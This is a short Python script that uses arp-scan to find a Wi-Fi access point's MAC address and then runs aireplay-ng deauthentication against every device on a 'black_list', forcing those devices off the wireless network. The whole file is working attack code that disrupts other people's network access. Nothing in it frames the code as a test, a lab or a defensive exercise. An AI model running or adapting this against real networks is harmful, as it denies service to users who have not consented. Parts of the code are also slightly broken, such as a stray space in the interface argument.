from time import sleep
from scapy.all import *
def deauth_find_acces_point_mac_addr(gateway_list,re_eng_ip,re_eng_mac):
    print('Access point')
    out = subprocess.Popen(['arp-scan', ' --interface=wlp2s0', '192.168.1.0/24'],
                           stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT)
    stdout, stderr = out.communicate()
    string = stdout.decode('utf-8')
    converted_list_of_new_lines = str(string).split('\n')

    for element in converted_list_of_new_lines:
        mac_addr = re_eng_mac.search(element)
        ipv4 = re_eng_ip.search(element)

        if ((ipv4 is not None) and (mac_addr is not None)):
            if(ipv4.group(0) in gateway_list):
                return mac_addr.group(0)

def deauth_attack_execution(acces_point_mac,black_list):
    for target_host in black_list:
        print(target_host.mac_addres)
        out = subprocess.Popen(['aireplay-ng','-0','1','-a',acces_point_mac,'-c', target_host.mac_addres,'wlp2s0','--ignore-negative-one'],
                           stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT)
        sleep(5)